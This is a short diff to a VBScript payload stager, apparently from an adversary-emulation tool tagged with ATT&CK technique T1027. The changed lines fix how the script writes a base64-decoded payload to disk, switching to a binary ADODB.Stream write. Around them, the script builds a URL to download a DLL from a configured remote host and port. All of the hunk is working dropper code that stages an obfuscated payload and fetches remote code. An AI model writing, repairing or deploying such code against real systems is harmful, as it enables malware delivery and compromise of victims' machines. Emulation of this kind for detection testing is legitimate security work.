@@ -61,9 +61,15 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 If http_host <> "" And http_port <> "" And dll_name <> "" And dll_dir <> "" Then
     If Not fso.FolderExists(dll_dir) Then fso.CreateFolder(dll_dir)
     If b64_value <> "" Then
-        Dim out
-        out = B64Decode(b64_value)                       ' T1027 observable
-        fso.CreateTextFile(dll_dir & "\" & b64_name, True).Write out
+        Dim out, b64stream
+        out = B64Decode(b64_value)                       ' T1027 observable; returns a Byte array
+        ' write the decoded raw bytes via binary stream (TextStream.Write only accepts String)
+        Set b64stream = CreateObject("ADODB.Stream")
+        b64stream.Type = 1
+        b64stream.Open
+        b64stream.Write out
+        b64stream.SaveToFile dll_dir & "\" & b64_name, 2
+        b64stream.Close
     End If
     Dim x, url
     url = "http://" & http_host & ":" & http_port & "/" & dll_name
